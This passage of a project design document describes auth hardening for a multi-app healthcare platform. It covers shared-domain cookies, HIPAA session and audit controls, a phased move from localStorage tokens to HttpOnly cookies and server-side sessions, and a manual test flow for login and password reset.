#### Cross-App Auth: Shared Cookie Domain (Replaces URL Token Passing)

When apps are consolidated under a single domain (see "Future Architecture: Route Consolidation" above), cookies with `Domain=localhost` or `Domain=.yourdomain.com` are shared across all routes. This eliminates:
- URL token passing and its log/referrer/history leaks
- Per-app `localStorage` isolation issues
- The need to copy auth guard components across apps

Even before consolidation, a reverse proxy (nginx, Caddy) can serve all apps under one domain with path-based routing (`/incident-analyzer`, `/supplier-directory`, etc.), making cookie sharing work across the current multi-app architecture.

#### Additional HIPAA Controls

| Control | Implementation |
|---|---|
| **Idle timeout** | Server-side: reject sessions idle >15 min. Client-side: detect inactivity and warn before forced logout |
| **Concurrent session limit** | Cap to 1 active session per user. On new login, revoke all previous sessions |
| **Audit log** | Log every login, logout, failed attempt, session revocation with user ID, timestamp, IP address, and action |
| **Token content** | Never include PHI in JWT payloads — only opaque user ID, role, `exp`, `iss`, `aud` |
| **Password policy** | Enforce min length, complexity, and expiry rotation per §164.312(d) |
| **Rate limiting** | Limit login attempts per IP/email to prevent brute force |

### Migration Path

When moving from the current implementation to HIPAA-compliant production:

1. **Phase 1 — HttpOnly cookies:** Replace `localStorage` with `HttpOnly` cookie storage. Minimal frontend changes (remove `localStorage` calls, let browser handle cookies). Biggest security win for least effort.
2. **Phase 2 — Refresh token rotation:** Add a refresh token flow with rotation and reuse detection. Requires a `refresh_tokens` table in the database.
3. **Phase 3 — Opaque sessions:** Replace JWT access tokens with server-side opaque sessions. Requires a `sessions` table and a DB lookup on every request (acceptable for TinyDB at dev scale; use Redis or PostgreSQL in production).
4. **Phase 4 — Route consolidation + shared cookies:** Merge apps under one domain/port. Cookies are shared automatically. Remove URL token passing and per-app auth guards.

Each phase is independently deployable and incrementally improves the security posture.

---
- Start the API: `cd services/api && uv run uvicorn app.main:app`
- Start all frontend apps on their respective ports
- Full flow:
  1. Visit landing page → see hero with Login/Register
  2. Register a new user → auto-login → see "Welcome, {name}" + nav cards
  3. Click Incident Analyzer card → opens on port 3002, auth guard accepts token
  4. Go back to landing → click Profile → edit name → verify save
  5. Change password → log out → verify redirect to login
  6. Forgot password → get reset token → reset → login with new password
  7. Visit public website on port 3005 → works with zero auth prompts
  8. Access any protected app directly without token → redirects to login
